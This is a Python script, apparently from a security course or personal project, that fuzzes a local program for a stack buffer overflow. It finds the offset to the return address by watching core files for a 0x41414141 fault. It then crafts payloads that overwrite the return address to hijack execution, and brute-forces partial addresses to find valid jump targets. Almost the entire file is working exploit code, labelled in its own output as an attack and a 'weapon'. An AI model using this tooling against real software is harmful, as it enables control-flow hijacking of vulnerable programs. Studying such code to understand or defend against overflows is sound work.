
import subprocess
import pexpect
import sys
import subprocess
from pwn import *
from pwnlib import *
from pwn import p32

#Helper function that calls a program as if it were called from the command line
def cmd_line_call(name, args):
    child = pexpect.spawn(name, [args])
    # Wait for the end of the output
    child.expect(pexpect.EOF)
    out = child.before  # we get all the data before the EOF (stderr and stdout)
    child.close()  # that will set the return code for us
    # signalstatus and existstatus read as the same (for my purpose only)
    if child.exitstatus is None:
        returncode = child.signalstatus
    else:
        returncode = child.exitstatus
    return (out, returncode)


#Find the minimum length of the input string that can corrupt the memory
def find_min_bad_len(fuzz_file, fuzzed_program, mutations, input_from_file,detailed_log):
    min_bad_len = sys.maxsize
    len_to_reach_return_addr = sys.maxsize
    inp = ""
    min_bad_inp=inp
    broken=0
    for i in range(1,mutations):
        inp = inp + 'A'
        curr_len = len(inp)
        # create files and keep feeding them into the system
        if input_from_file:
            file = open(fuzz_file, 'wb')
            file.write(curr_len.to_bytes(4, 'big'))
            file.write(bytes(inp, 'utf-8'))
            file.close()
        try:
            if input_from_file:
                output = subprocess.run([fuzzed_program, fuzz_file], capture_output=True, text=True, shell=False, check=True, errors='ignore')
            else:
                output = subprocess.run([fuzzed_program, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
            if detailed_log:
                print(output.stdout)
                print(output.stderr)
        except subprocess.CalledProcessError:
            if broken==0:
                min_bad_len = curr_len
                min_bad_inp=curr_len.to_bytes(4, 'big')+bytes(inp, 'utf-8')
                broken=1
                if detailed_log:
                    print(i, f"crushed the system with inp={repr(inp)} and len=", curr_len)
            fault_addr=sig_fault_addr()    
            if fault_addr== '0x41414141':
                len_to_reach_return_addr=curr_len-4
                break
    print(f"The minimum bad len input that was found is {min_bad_len} + the 4 leading bytes representing the length of the buffer")
    print("A generic input that would cause the system to fail could look like this:")
    print(min_bad_inp)
    return len_to_reach_return_addr


#Attempt to deturn the execution of the program by inserting in the input string an address to go to 
def attack_system(len_to_reach_return_addr, fuzzed_program, fuzz_file, attack_address,input_from_file, detailed_log):
    if len_to_reach_return_addr==sys.maxsize:
        print("System was not broken due to lack of mutations or segmentation fault not occuring")
        return 0
    if input_from_file:
        input_from_file = open(fuzz_file, 'wb')
        attack_len = (len_to_reach_return_addr + 4).to_bytes(4, 'big')
        attack_string = b'A' * len_to_reach_return_addr + attack_address
        input_from_file.write(attack_len)
        input_from_file.write(attack_string)
        input_from_file.close()
        if detailed_log:
            print("NOW WE ATTACK")
            print("This is our weapon ", fuzz_file)
            print(attack_len)
            print(attack_string)
        output, return_code = cmd_line_call(fuzzed_program, fuzz_file)
        if detailed_log:
            print(output)
            print("Return code=", return_code)
    else:
        inp=len_to_reach_return_addr*b"A"
        inp=inp+attack_address
        attack_len=(len_to_reach_return_addr + 4)
        if detailed_log:
            print("NOW WE ATTACK")
            print("This is our weapon ", inp)
        subprocess.call([fuzzed_program,inp])
        
    return attack_len


#Attempt to break the system while the system reads the input feeding it extremely large strings
def break_system_before_return(len_to_reach_return_addr, fuzzed_program, fuzz_file, input_from_file,detailed_log):
   # +4 to overwrite the return address
    inp = b'A' * (len_to_reach_return_addr + 4)
    i=1
    gb=10_000_000_000
    fault_addr='0x41414141'
    while i<gb and fault_addr== '0x41414141':
        inp = inp + i*b'A'
        curr_len = len_to_reach_return_addr+4+i
        # create files and keep feeding them into the system
        if input_from_file:
            file = open(fuzz_file, 'wb')
            file.write(curr_len.to_bytes(4, 'big'))
            file.write(inp)
            file.close()
            output, return_code = cmd_line_call(fuzzed_program, fuzz_file)
            if detailed_log:
                print(output)
                print(return_code)   
                print("Len=", curr_len)
                print("Si_addr=", sig_fault_addr())
        else:
            try:
                output = subprocess.run([fuzzed_program, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                if detailed_log:
                    print(output)
                    print(output.returncode)
            except subprocess.CalledProcessError:
                if detailed_log:
                    print("Len=", curr_len)
                    print("Si_addr=", sig_fault_addr())
            except OSError:
                break
        i=i*10
        fault_addr=sig_fault_addr()
    if i>=gb:
        print("The attack buffer can be at least 1 GB in size")
    else:
        print(f"The attack buffer can be at least {int(i/10)} bytes in size")

#Make the address big endian
#returns a normal view of the address into a string form
def convert_address_to_string(addr):
    addr=str(addr)
    aux=addr.replace("\\x",'')
    aux=aux.replace("b'",'')
    aux=aux.replace('\'','')
    flip_bytes=""
    i=1
    auxc=''
    for c in reversed(aux):
        if i%2==1:
            auxc=c
        else:
            flip_bytes=flip_bytes+c+auxc
        i=i+1
    return flip_bytes


# partial address must contain full bytes
def attack_with_partial_address(len_to_reach_return_addr, partial_address, mask, fuzzed_program, fuzz_file, input_from_file,detailed_log):

    # build the address
    unknown_nibble_nr = 8-mask.count('F')
    possible_addresses= pow(16,unknown_nibble_nr)
    partial_address_to_int=int(partial_address,base=16)-1
    valid_addresses=[b'0']
    for i in range(possible_addresses.__round__()):
        partial_address_to_int=partial_address_to_int+1
        attack_address=p32(partial_address_to_int, endian='little')
        # build the attack
        attack_len = (len_to_reach_return_addr + 4).to_bytes(4, 'big')
        inp = b'A' * len_to_reach_return_addr
        if input_from_file:
            file = open(fuzz_file, 'wb')
            file.write(attack_len)
            file.write(inp)
            file.write(attack_address)
            file.close()
        
        if detailed_log:
            print("NOW WE ATTACK ",i)
            print("This is our weapon ", fuzz_file)
            print(inp)
            print(attack_address)
        try:
            if input_from_file:
                output = subprocess.run([fuzzed_program, fuzz_file], capture_output=True, text=True, shell=False, check=True, errors='ignore')
            else:
                inp=inp+attack_address
                output = subprocess.run([fuzzed_program, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
            if detailed_log:
                print(output)
        except subprocess.CalledProcessError:
            fault_addr=sig_fault_addr().replace("0x",'')
            my_addr=convert_address_to_string(attack_address)
            if fault_addr!='0' and fault_addr!=my_addr:
                #execution got deflected to a valid address
                valid_addresses.append(attack_address)
            else:
                if detailed_log:
                    print("Not a valid address", attack_address)
        except ValueError:
            if detailed_log:
                print("Address contains null bytes",attack_address)
    valid_addresses.remove(b'0')
    return valid_addresses
    
 #Extract the fault_addr value with the help of the core file 
def sig_fault_addr():

    c = Corefile('./core')
    return hex(c.fault_addr)